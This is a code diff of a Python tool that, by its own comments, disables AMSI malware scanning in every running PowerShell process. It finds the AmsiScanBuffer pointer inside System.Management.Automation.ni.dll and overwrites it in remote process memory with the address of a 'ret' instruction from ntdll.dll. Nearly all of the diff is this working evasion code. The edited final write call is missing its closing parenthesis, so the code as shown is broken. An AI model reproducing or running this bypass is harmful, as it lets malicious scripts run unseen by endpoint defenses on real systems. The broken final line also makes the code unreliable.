@@ -137,6 +137,7 @@ def readfromMem(process_handle,base_address,buffertosearch):
         else:
             print(f"[-] Fin del módulo o página inaccesible alcanzada en: {hex(base_address)}. Deteniendo escaneo.")
             return None
+        #reading in chunks to save so much fucking time
         base_address += (0x1000 - len(buffertosearch))
 
     
@@ -154,18 +155,7 @@ def find_module_handle(modulename,pid):
     #get the first module and increment the module until the needed one is found
     get_first_module = MainSetup.KERNEL32.Module32First(get_module_handle,byref(me32))
     while get_first_module:
-        if modulename == "System.Management.Automation.ni.dll":
-            #if the module name matches, return the module address +0x1000 to not only make searching faster but in the case of ntdll its to not make it find the header
-            if me32.szModule == bytes(modulename,encoding="utf8"):
-                print(f"[+] Found {me32.szModule.decode()} with address {hex(me32.modBaseAddr)}")
-                #close handle
-                MainSetup.KERNEL32.CloseHandle(get_module_handle)
-                #return address of the module +0x1000
-                return me32.modBaseAddr
-            else:
-                #if not found continue down the list until it is
-                get_first_module = MainSetup.KERNEL32.Module32Next(get_module_handle,byref(me32))
-        elif modulename == "ntdll.dll":
+        if modulename == "ntdll.dll":
              #if the module name matches, return the module address +0x1000 to not only make searching faster but in the case of ntdll its to not make it find the header
             if me32.szModule == bytes(modulename,encoding="utf8"):
                 print(f"[+] Found {me32.szModule.decode()} with address {hex(me32.modBaseAddr)}")
@@ -177,22 +167,17 @@ def find_module_handle(modulename,pid):
                 #if not found continue down the list until it is
                 get_first_module = MainSetup.KERNEL32.Module32Next(get_module_handle,byref(me32))
         else:
-             #if the module name matches, return the module address +0x1000 to not only make searching faster but in the case of ntdll its to not make it find the header
             if me32.szModule == bytes(modulename,encoding="utf8"):
                 print(f"[+] Found {me32.szModule.decode()} with address {hex(me32.modBaseAddr)}")
                 #close handle
                 MainSetup.KERNEL32.CloseHandle(get_module_handle)
-                #return address of the module +0x1000
+                #return address of the module
                 return me32.modBaseAddr
             else:
                 #if not found continue down the list until it is
                 get_first_module = MainSetup.KERNEL32.Module32Next(get_module_handle,byref(me32))
             
                    
-
-
-
-
 
 
 #iterate through every pid found in system
@@ -209,19 +194,20 @@ for pidx in getPowershellPids():
 
     #Find the ret in memory of ntdll.dll
     ret_instruction = readfromMem(process_handle=process_handle,base_address=ntdll_handle,buffertosearch=MainSetup.Ret)
+    #Find Amsi
     amsi_scanbuffer_handle = find_module_handle("amsi.dll",pidx)
+    #Find the address of AmsiScanBuffer to be able to identify the pointer
     find_amsiscanbuffer = readfromMem(process_handle=process_handle,base_address=amsi_scanbuffer_handle,buffertosearch=MainSetup.RealAmsiScanBuffer)
-    bytes_puntero_buscado = struct.pack("<Q", find_amsiscanbuffer)
+    #Turn the address into lil endian
+    amsipointer_addr = struct.pack("<Q", find_amsiscanbuffer)
     #Get handle to System.Management
     System_management_handle = find_module_handle("System.Management.Automation.ni.dll",pidx)
     #Find the vulnerable mov instruction
-    mov_instruction = readfromMem(process_handle=process_handle,base_address=System_management_handle,buffertosearch=bytes_puntero_buscado)
-    #convert the mov, rax,[pointer to ret] into usable python bytes
-    assembly_instrucction = bytes.fromhex((assemble(f"mov rax,{hex(ret_instruction)}")).replace("\\x", ""))
+    mov_instruction = readfromMem(process_handle=process_handle,base_address=System_management_handle,buffertosearch=amsipointer_addr)
 
-    print(f"[!] Using asm instrucction: {assembly_instrucction}")
-    nuevos_bytes_puntero = struct.pack("<Q", ret_instruction)
+    lil_ret = struct.pack("<Q", ret_instruction)
     #write the patch to memory
-    writetomem(process_handle,mov_instruction,nuevos_bytes_puntero)
+    writetomem(process_handle,mov_instruction,lil_ret
+    #close handle
     MainSetup.KERNEL32.CloseHandle(process_handle)
     print("\n")
